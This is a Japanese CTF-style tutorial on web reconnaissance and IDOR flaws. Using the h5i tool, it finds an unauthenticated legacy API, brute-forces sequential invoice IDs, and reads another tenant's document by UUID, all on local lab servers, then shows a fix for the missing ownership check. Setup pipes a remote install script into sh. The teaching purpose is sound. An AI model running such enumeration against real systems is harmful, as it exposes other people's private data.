---
title: CTF形式で徹底的に学ぶWeb Security ② - 偵察とIDOR (不安全な直接オブジェクト参照)
tags: Security CTF Web ハッキング セキュリティ対策
author: Koukyosyumei
slide: false
---
コロンビア大学の博士課程でAI・システムセキュリティの研究をしているKoukyosyumeiです。この記事では、攻撃者がどのようにターゲットのウェブサイトを偵察するかや、IDOR (Insecure Direct Object Reference)の基礎を解説します。

## セットアップ

まだh5iをインストールしていない場合は、公式の手順に従ってバイナリをダウンロードしましょう。

```console
$ curl -fsSL https://h5i.dev/install.sh | sh -s -- --websec
```

次に、h5iのチュートリアル用レポジトリをクローンします。このレポジトリには、CTF形式のラボが格納されており、基本的にはサーバーやページの脆弱性を利用してフラグを見つけることがゴールです。

```console
$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
```

### ブラウザの準備

h5iのセッションは、実際のChromium (agent-browser) をh5iのキャプチャプロキシ経由で動かします。そのため、Node.jsをインストールしたうえで、agent-browserを用意しておきます。

```console
$ npm install -g agent-browser && agent-browser install
```

Linuxのarm64環境では、agent-browserが同梱するChromiumが起動しないことがあります。その場合は、システムにインストール済みのChromiumを指すように環境変数を設定してください。

```console
$ export AGENT_BROWSER_EXECUTABLE_PATH=/path/to/chrome
```

## 課題 5: 基礎的な偵察

```console
$ ./run.sh 05
```

とても簡単なドキュメントサイトが立ち上がります。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/1c5cdebf-fc7e-4976-8668-bbf2e5c627eb.png)

h5iを使ってシェルからも同様にページにアクセスしてみましょう。

```console
$ h5i browser open 'http://127.0.0.1:9050/' \
  --session lab05 --new
$ h5i browser snapshot --session lab05
- heading "Acme Intranet" [level=1, ref=e1]
- paragraph
  - link "docs" [ref=e2]
  - StaticText " · "
  - link "whoami" [ref=e3]
```

ページの構造は`h5i browser snapshot`でアクセシビリティツリーとして確認できます。各要素には`@ref`のハンドルが付与され、他のブラウザ操作コマンドから参照できます。

`/api/v3/whoami`にアクセスしても、トークンを指定しないと動かせないようです。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/752bdb59-af38-4257-a956-f6f381651477.png)

次に、このウェブページの構造を探検してみましょう。まずは`robots.txt`を確認します。

リクエストを再送するには、もとになるリクエストのidが必要です。セッションの中身は実際のChromiumが動かしているので、ページ本体のリクエスト以外にも、Chromiumが裏で投げる更新チェックのような通信や`/favicon.ico`の取得が混ざります。これらも1つずつidを消費するため、リクエストidは必ずしも0、1、2と連番にはなりません。そこで、`h5i websec requests`で目的のパスを含むリクエストだけ絞り込み、本物のidを確認します。

```console
$ h5i websec requests --session lab05 --url-contains '9050/'
req_3             GET http://127.0.0.1:9050/
res_3         200 GET http://127.0.0.1:9050/ (145 bytes, 1ms)
req_7             GET http://127.0.0.1:9050/favicon.ico
res_7         404 GET http://127.0.0.1:9050/favicon.ico (46 bytes, 43ms)
```

トップページのリクエストは`req_3`でした。これを`robots.txt`に書き換えて再送します。`h5i websec replay`は、既定でレスポンスの内容までそのまま表示してくれます。

```console
$ h5i websec replay req_3 --session lab05 --set path=/robots.txt
res_12 ← req_12 · 200 · 54 bytes · 1 ms
sent  GET http://127.0.0.1:9050/robots.txt
set   path=/robots.txt (was /)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:03 GMT
content-type: text/plain; charset=utf-8
content-length: 54

User-agent: *
Disallow: /internal/
Disallow: /api/v0/
```

さらに`/docs`・`/internal/notes.md`と辿っていくと、APIに関する更新情報が見つかります。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/c923c87d-6f0a-4653-94ee-dec1ccc8ff9e.png)


![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/77ea59c7-de01-48f0-9db3-c1554fe7b1ef.png)

どうやら昔のv0 APIは認証なしで使うことができるようです。

```console
$ h5i websec replay req_3 --session lab05 \
  --set path=/api/v0/employee/1
res_13 ← req_13 · 200 · 81 bytes · 42 ms
sent  GET http://127.0.0.1:9050/api/v0/employee/1
set   path=/api/v0/employee/1 (was /)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:03 GMT
content-type: application/json
content-length: 81

{"id": 1, "name": "svc-deploy", "notes": "ssh key passphrase: FLAG{recon_trail}"}
```

無事フラグが見つかりました。h5iはこのような探索中に見つかった様々なページのサイトマップを自動で構築してくれます。ポリシーで拒否された、Chromiumの裏側の通信先も別枠でまとめて確認できます。

```console
$ h5i websec sitemap --session lab05
  http://127.0.0.1:9050
    /                                GET      200          x1
    /api/v0/employee/1               GET      200          x1
    /favicon.ico                     GET      404          x1
    /internal/notes.md               GET      200          x1
    /robots.txt                      GET      200          x1

  refused by policy:
    http://clients2.google.com/time/1/current?cup2key=ML-DSA-44-10:...
    https://update.googleapis.com/service/update2/json?cup2key=ML-DSA-44-16:...
    https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard&laf=b64bin
    https://www.google.com/async/ddljson?async=ntp:2,anim:1
    https://redirector.gvt1.com/edgedl/chrome/dict/en-us-10-2.bdic
```

## 課題 6: インボイスIDを総当たりしてみる

```console
$ ./run.sh 06
```

どうやらなんらかの請求書などを管理するサイトのようです。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/edcaf846-91cd-460a-86db-6b053a41aec1.png)

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/6657cd55-9a80-42ba-bf05-0cb12ebfbe4d.png)

実験的にidを変えたらどうなるかを確認してみましょう。

```console
$ h5i browser open \
  'http://127.0.0.1:9060/api/invoice?id=1041' \
  --session lab06 --new
$ h5i websec requests --session lab06 --url-contains 'invoice'
req_4             GET http://127.0.0.1:9060/api/invoice?id=1041
res_4         200 GET http://127.0.0.1:9060/api/invoice?id=1041 (62 bytes, 0ms)
$ h5i websec show res_4 --session lab06 --raw
HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:29 GMT
content-type: application/json
content-length: 62

{"viewer_account": 77, "id": 1041, "account": 77, "total": 41}
$ h5i websec replay req_4 --session lab06 --set query.id=1040
res_11 ← req_11 · 200 · 62 bytes · 1 ms
sent  GET http://127.0.0.1:9060/api/invoice?id=1040
set   query.id=1040 (was 1041)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:32 GMT
content-type: application/json
content-length: 62

{"viewer_account": 77, "id": 1040, "account": 77, "total": 40}
```

とくに認証エラーなどがでることなく、別のインボイスの内容が確認できました。ここで疑問に感じるのは、"はたしてサーバーはviwer_accountのインボイスIDの組み合わせを検証しているのか？"ということです。このような場合は、とりあえず近くの値を総当たりで試してみて、何が起きるかを確認しましょう。

```console
 $ for id in $(seq 1000 1050); do
    printf '%s ' "$id"
    h5i websec replay req_4 --session lab06 \
      --reset-budget --set "query.id=$id" --json |
      python3 -c 'import json,sys; r=json.load(sys.stdin)["response"]; print(r["status"], r["bytes"])'
  done
1000 200 62
1001 200 62
1002 200 62
1003 200 62
1004 200 113
1005 200 62
1006 200 62
1007 200 62
1008 200 62
1009 200 62
1010 200 62
...
```

`id=1004`のときのみ、レスポンスが異なるようです。

```console
$ h5i websec replay req_4 --session lab06 --reset-budget \
  --set query.id=1004
res_65 ← req_65 · 200 · 113 bytes · 1 ms
sent  GET http://127.0.0.1:9060/api/invoice?id=1004
set   query.id=1004 (was 1041)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:41 GMT
content-type: application/json
content-length: 113

{"viewer_account": 77, "id": 1004, "account": 1, "total": 0, "memo": "escrow release code FLAG{idor_sequential}"}
```

フラグが取得できました！！

このウェブサイトは、典型的な認証忘れのバグを含んでいました。

```python
who = req.cookies.get("account", "77")
row = INVOICES.get(wanted)
return js({"viewer_account": int(who), **row})
```

このプログラムの修正としては、例えば以下のようにインボイスのオーナーのIDをきちんと照合するというものが考えられます。

```python
row = INVOICES.get(wanted)
if not row or row["account"] != session.account:
    return js({"error": "no such invoice"}, 404)
```

## 課題 7: UUIDだけでは不十分な例

```console
$ ./run.sh 07
```

次の課題では、総当たりを難しくするために、idがランダム化された値になっているようです。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/df327f21-8544-4698-91cb-f79a8f821b95.png)

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/c713a9d4-85eb-4bd1-bc44-faac9f260be2.png)

同様にシェルからもアクセスして、適当な`q=report`という条件で検索してみましょう。

```console
$ h5i browser open \
  'http://127.0.0.1:9070/api/search?q=report' \
  --session lab07 --new
$ h5i websec requests --session lab07 --url-contains 'search'
req_2             GET http://127.0.0.1:9070/api/search?q=report
res_2         200 GET http://127.0.0.1:9070/api/search?q=report (117 bytes, 2ms)
$ h5i websec show res_2 --session lab07 --raw
HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:50 GMT
content-type: application/json
content-length: 117

{"q": "report", "hits": [{"id": "0d6d25cc-816e-a822-33f4-43e61907948c", "title": "TPS Report", "tenant": "initech"}]}
```

私たちのtenantは`acme`のはずなのに、`initech`のドキュメントにアクセスできてしまいました。この課題のゴールは`Initech's break-glass document.` を探すことなので、同様に検索してみましょう。

```console
$ h5i websec replay req_2 --session lab07 --set query.q=glass
res_11 ← req_11 · 200 · 117 bytes · 1 ms
sent  GET http://127.0.0.1:9070/api/search?q=glass
set   query.q=glass (was report)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:52 GMT
content-type: application/json
content-length: 117

{"q": "glass", "hits": [{"id": "94e1d935-a208-f5e8-e5b9-b8e47e375110", "title": "Break-glass", "tenant": "initech"}]}
```

ドキュメントのidが見つかったので、直接そのドキュメントにアクセスしてみます。

```console
$ h5i websec replay req_2 --session lab07 \
  --set path=/api/document/94e1d935-a208-f5e8-e5b9-b8e47e375110
res_13 ← req_13 · 200 · 144 bytes · 1 ms
sent  GET http://127.0.0.1:9070/api/document/94e1d935-a208-f5e8-e5b9-b8e47e375110?q=report
set   path=/api/document/94e1d935-a208-f5e8-e5b9-b8e47e375110 (was /api/search)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:57 GMT
content-type: application/json
content-length: 144

{"id": "94e1d935-a208-f5e8-e5b9-b8e47e375110", "tenant": "initech", "title": "Break-glass", "body": "Emergency admin password: FLAG{idor_uuid}"}
```

フラグを取ることができました！

## まとめ

最後にセッションを片付けておきましょう。

```
$ h5i browser close --session lab05
$ h5i browser close --session lab06
$ h5i browser close --session lab07
```

**参照**

https://h5i.dev/guides/recon-and-idor/

https://github.com/h5i-dev/h5i

https://qiita.com/Koukyosyumei/items/70bdd6fb05fdde09081c








